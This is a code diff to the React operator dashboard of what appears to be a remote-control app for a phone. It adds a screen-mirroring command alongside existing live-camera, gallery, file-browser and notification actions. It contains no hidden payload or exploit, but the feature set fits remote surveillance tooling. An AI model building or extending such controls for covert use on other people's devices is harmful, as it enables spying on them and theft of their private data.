@@ -6,6 +6,7 @@ import {
     Image,
     LayoutGrid,
     MessageSquare,
+    Monitor as MonitorIcon,
     Phone,
     RefreshCw,
     User,
@@ -13,7 +14,7 @@ import {
 } from 'lucide-react';
 import toast from 'react-hot-toast';
 import { useDispatch, useSelector } from 'react-redux';
-import { addPendingCommand, removePendingCommand, setCameraFrame, setIsCameraStreaming } from '../../store/slices/remoteControlSlice';
+import { addPendingCommand, removePendingCommand, setCameraFrame, setIsCameraStreaming, setScreenFrame } from '../../store/slices/remoteControlSlice';
 
 const categories = [
   {
@@ -32,6 +33,7 @@ const categories = [
     color: 'purple',
     actions: [
       { id: 'camera', label: 'Live Camera', icon: <Camera size={18} />, action: 'camera_stream' },
+      { id: 'screen_mirror', label: 'Screen Mirroring', icon: <MonitorIcon size={18} />, action: 'screen_share' },
       { id: 'photos', label: 'Gallery', icon: <Image size={18} />, altType: 'GET_GALLERY' },
       { id: 'files', label: 'File Browser', icon: <Folder size={18} />, action: 'files' },
     ],
@@ -52,6 +54,7 @@ export default function CommandDashboard({ sendCommand, browseFiles }) {
   const dispatch = useDispatch();
   const { 
     cameraFrame, 
+    screenFrame,
     isCameraStreaming,
     pendingCommands, 
     currentPath,
@@ -61,6 +64,7 @@ export default function CommandDashboard({ sendCommand, browseFiles }) {
 
   const isActive = (act) => {
     if (act.id === 'camera') return isCameraStreaming;
+    if (act.id === 'screen_mirror') return !!screenFrame;
     if (act.altType === 'GET_GALLERY') return showFileExplorer && currentPath === 'Image Gallery';
     if (act.action === 'files') return showFileExplorer && currentPath !== 'Image Gallery';
     if (act.altType === 'GET_NOTIFICATIONS') return showNotificationsModal;
@@ -97,6 +101,22 @@ export default function CommandDashboard({ sendCommand, browseFiles }) {
               toast.success('Camera stream requested');
            } else {
               toast.error('Failed to start camera');
+           }
+        });
+      }
+    } else if (act.id === 'screen_mirror') {
+      if (screenFrame) {
+        sendCommand('SCREEN_SHARE_STOP');
+        dispatch(setScreenFrame(null));
+        toast.success('Screen mirroring stopped');
+      } else {
+        dispatch(addPendingCommand({ type: 'SCREEN_SHARE_START' }));
+        sendCommand('SCREEN_SHARE_START', {}, (response) => {
+           dispatch(removePendingCommand({ type: 'SCREEN_SHARE_START' }));
+           if (response && response.success) {
+              toast.success('Screen mirroring started');
+           } else {
+              toast.error('Failed to start screen mirroring');
            }
         });
       }
